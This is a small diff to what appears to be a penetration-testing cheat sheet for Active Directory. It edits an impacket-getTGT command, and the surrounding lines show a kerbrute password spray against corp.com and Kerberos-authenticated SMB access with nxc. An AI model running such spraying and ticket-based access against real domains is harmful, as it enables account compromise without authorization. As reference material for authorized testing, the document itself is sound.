@@ -1835,7 +1835,7 @@ kerbrute passwordspray -d corp.com .\usernames.txt "pass"
 ```
 ### Requesting a Kerberos TGT
 ```bash
-impacket-getTGT "$DOMAIN/user:password" # Request Kerberos TGT
+impacket-getTGT 'DOMAIN/USERNAME:PASSWORD' -dc-ip <DC-IP> # Request Kerberos TGT
 export KRB5CCNAME=$(pwd)/user.ccache # Load ticket cache
 klist # View cached ticket
 nxc smb $DC -u user -d $DOMAIN -k # Authenticate using Kerberos
